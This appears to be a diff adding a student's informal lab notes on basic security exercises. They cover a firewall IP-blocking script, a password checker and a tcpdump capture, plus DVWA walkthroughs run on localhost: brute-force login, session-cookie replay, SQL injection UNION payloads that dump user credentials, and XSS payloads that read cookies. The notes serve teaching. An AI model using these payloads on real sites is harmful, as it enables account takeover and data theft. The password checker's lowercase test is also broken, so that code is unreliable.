@@ -1,0 +1,121 @@
+(1.FIRE WALL):
+
+import subprocess
+
+ip = "1.2.3.4"   # IP to block
+rule = f"netsh advfirewall firewall add rule name='BlockIP' Dir=Out Action=Block RemoteIP={ip}"
+subprocess.run(["powershell", "-Command", rule])
+
+print("IP Blocked Successfully")
+
+
+(2.Password Checker)
+
+import re
+p=input("Enter pass")
+if len(p)<8 or not any(c.isdigit() for c in p) or not any(c.isupper() for c in p) or not any(c.lower() for c in p):
+    print("weak pass")
+elif not re.search(r'[!@#$%^&*]',p):
+    print("medium pass")
+else:
+    print("stronge pass")
+
+
+(3.Phising )
+
+Eml analyzer,virustotal
+
+
+(4.Packet sniffing and Network Traffic Analysis)
+
+->in frst terminal python3 -m http.server 8080
+->another terminal sudo tcpdump -i any -w capture.pcap port 8080
+->open firefox http://localhost:8080  and refresh
+->go to sec terminal press Ctrl+c
+->File manager open home folder see capture.pcap.   just double click file will directly open
+
+->on top  empty box write http.request.method=="GET"
+->click on any one of the packet
+
+
+(5.Testing authentication)
+
+->open terminal 
+sudo service apache2 start 
+sudo service mysql start
+
+->open firefox enter http://127.0.0.1/dvwa
+->default passwords admin and password
+->go to dvwa security select low and submit
+->DVWA->Vulnerabilities->Brute Force
+->don't change username change pass nd login only for right pass it will login
+
+(Session Id Analysis)
+
+Step 1: Login Normally (Victim Session) 
+1. Open Firefox 
+2. Go to: http://127.0.0.1/dvwa/ 
+3. Login: 
+Username: admin 
+Password: password 
+Step 2: Copy Session ID (IMPORTANT) 
+1. Right click → Inspect 
+2. Storage → Cookies → http://127.0.0.1 
+3. Copy: 
+PHPSESSID = be2d584526b42fef6742d5cf95ce008f 
+->and logout u will se login page
+
+ Open Private Window 
+Ctrl + Shift + P 
+2. Go to: 
+http://127.0.0.1/dvwa/ 
+3. Open Inspect → Storage → Cookies 
+4. Paste the OLD PHPSESSID (copied earlier) 
+5. Press Enter
+6.In address bar, type: http://127.0.0.1/dvwa/index.php
+7.logged in again.
+
+
+(6.SQL injection)
+
+
+->sudo service apache2 start 
+sudo service mysql start 
+->fire box 127.0.0.1 login
+->go to DVWA security select low and submit
+DVWA->Vulnerabilities->SQL Injection
+->user id 1 and 1' OR '1'='1
+-> 1' ORDER BY 1--- ,next at last 2 and 3
+-> UNION SELECT database(),2---
+-> 1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()-- -
+-> 1' UNION SELECT column_name,2  FROM information_schema.columns  
+WHERE table_name='users'-- -
+-> 1' UNION SELECT user,password FROM users-- -
+
+
+
+(7.XSS)
+
+-> sudo service apache2 start 
+sudo service mysql start
+-> Oen browser http://localhost/dvwa and login 
+->Click DVWA Security → set level to Low → Submit.
+->DVWA → XSS (Reflected) in input box <script>alert('XSS')</script> and submit
+->DVWA → XSS (Stored) and name it as Name: <h1>Hacked</h1> 
+Message:<script>alert('Stored XSS')</script>
+->Click Sign Guestbook and refresh page
+-> go to DVWA → XSS (DOM) and in url bar :
+#<script>alert('DOM XSS')</script>   and press enter.
+->In Stored XSS Message box: 
+<script>alert(document.cookie)</script>
+->Go to DVWA Security → set: 
+Medium 
+High   and repeat all steps 
+
+
+
+
+
+
+
+
